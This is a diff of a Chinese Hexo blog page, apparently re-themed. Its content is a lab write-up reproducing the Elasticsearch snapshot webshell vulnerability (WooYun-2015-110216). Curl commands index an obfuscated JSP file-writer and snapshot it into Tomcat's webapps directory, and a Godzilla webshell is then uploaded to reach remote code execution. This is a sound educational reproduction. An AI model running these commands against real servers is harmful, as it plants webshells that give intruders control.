@@ -13,10 +13,20 @@ ElasticSearch具有备份数据的功能，用户可以传入一个路径，让�
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>Elasticsearch写入webshell漏洞（WooYun-2015-110216） | hybcx&#39;s blog</title>
@@ -262,7 +272,7 @@ ElasticSearch具有备份数据的功能，用户可以传入一个路径，让�
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -319,7 +329,7 @@ ElasticSearch具有备份数据的功能，用户可以传入一个路径，让�
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -418,11 +428,6 @@ ElasticSearch具有备份数据的功能，用户可以传入一个路径，让�
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -448,14 +453,14 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
 <p>我们的目标就是利用 ElasticSearch，在 /usr/local/tomcat/webapps 目录下写入我们的 webshell。</p>
 <h2 id="0x03-漏洞复现">0x03 漏洞复现</h2>
 <p>访问存在的漏洞页面：（<strong>9200</strong>一般为<strong>ElasticSearch</strong>的常用端口），此漏洞环境需要与<strong>tomcat</strong>结合使用，发现<strong>8080</strong>端口存在<strong>tomcat</strong>默认配置页面。</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911203700629.png" alt="image-20230911203700629"></p>
+<p><img src="image-20230911203700629.png" alt="image-20230911203700629"></p>
 <p>发现<strong>9200</strong>端口存在<strong>elasticsearch</strong>页面：版本为1.5.1,确认存在漏洞</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911203915579.png" alt="image-20230911203915579"></p>
+<p><img src="image-20230911203915579.png" alt="image-20230911203915579"></p>
 <p>测试流程</p>
 <p>首先创建一个恶意索引文档：</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d' {"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>这里要用kali发送</strong></p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911204923665.png" alt="image-20230911204923665"></p>
+<p><img src="image-20230911204923665.png" alt="image-20230911204923665"></p>
 <p>再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。</p>
 <p>​		园长：这个 Repositories 的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。</p>
 <p>​		这里我把这个路径指向到了 tomcat 的 web 部署目录，因为只要在这个文件夹创建目录 Tomcat 就会自动创建一个新的应用 (文件名为 wwwroot 的话创建出来的应用名称就是 wwwroot 了)。</p>
@@ -466,35 +471,35 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
           "compress": false
      }
 }'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911204944234.png" alt="image-20230911204944234"></p>
+<p><img src="image-20230911204944234.png" alt="image-20230911204944234"></p>
 <p>存储库验证并创建:</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">curl -XPUT "http://ip:9200/_snapshot/yz.jsp/yz.jsp" -d '{
      "indices": "yz.jsp",
      "ignore_unavailable": "true",
      "include_global_state": false
 }'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911205018756.png" alt="image-20230911205018756"></p>
+<p><img src="image-20230911205018756.png" alt="image-20230911205018756"></p>
 <p>完成！</p>
 <p><strong>前三步主要是创建一个snapshot-yz.jsp脚本向wwwroot下的test.jsp文件中写入任意字符串）</strong></p>
 <p>访问<code> http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的 webshell。</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911205218875.png" alt="image-20230911205218875"></p>
+<p><img src="image-20230911205218875.png" alt="image-20230911205218875"></p>
 <p>该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符串，如：<code>http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>。</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911205240044.png" alt="image-20230911205240044"></p>
+<p><img src="image-20230911205240044.png" alt="image-20230911205240044"></p>
 <p>我们再访问 /wwwroot/test.jsp 就能看到 success 了：</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911205304011.png" alt="image-20230911205304011"></p>
+<p><img src="image-20230911205304011.png" alt="image-20230911205304011"></p>
 <p>现在来写入一句话木马，哥斯拉生成一句话木马：</p>
 <p><strong>生成jsp的shell：</strong></p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911214010387.png" alt="image-20230911214010387"></p>
+<p><img src="image-20230911214010387.png" alt="image-20230911214010387"></p>
 <p>如上图进行配置生成木马。</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911210448171.png" alt="image-20230911210448171"></p>
+<p><img src="image-20230911210448171.png" alt="image-20230911210448171"></p>
 <p><strong>URL编码jsp的shell并在f=后输入改编码好的shell:</strong></p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911214056109.png" alt="image-20230911214056109"></p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911214113531.png" alt="image-20230911214113531"></p>
+<p><img src="image-20230911214056109.png" alt="image-20230911214056109"></p>
+<p><img src="image-20230911214113531.png" alt="image-20230911214113531"></p>
 <p>访问test.jsp发现成功上传shell，直接哥斯拉连接一下</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911213837138.png" alt="image-20230911213837138"></p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911214243324.png" alt="image-20230911214243324"></p>
+<p><img src="image-20230911213837138.png" alt="image-20230911213837138"></p>
+<p><img src="image-20230911214243324.png" alt="image-20230911214243324"></p>
 <p>点击测试连接发现成功，直接添加看看</p>
-<p><img src="/2023/09/11/elasticsearch-xie-ru-webshell-lou-dong-wooyun-2015-110216/image-20230911214305046.png" alt="image-20230911214305046"></p>
+<p><img src="image-20230911214305046.png" alt="image-20230911214305046"></p>
 <p>发现成功rce</p>
 <h2 id="0x04-修复建议">0x04 修复建议</h2>
 <p>1、升级版本</p>
@@ -597,7 +602,7 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -605,7 +610,7 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -885,12 +890,12 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1027,6 +1032,8 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1054,8 +1061,8 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1138,8 +1145,6 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1159,24 +1164,28 @@ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></s
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1388,8 +1397,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
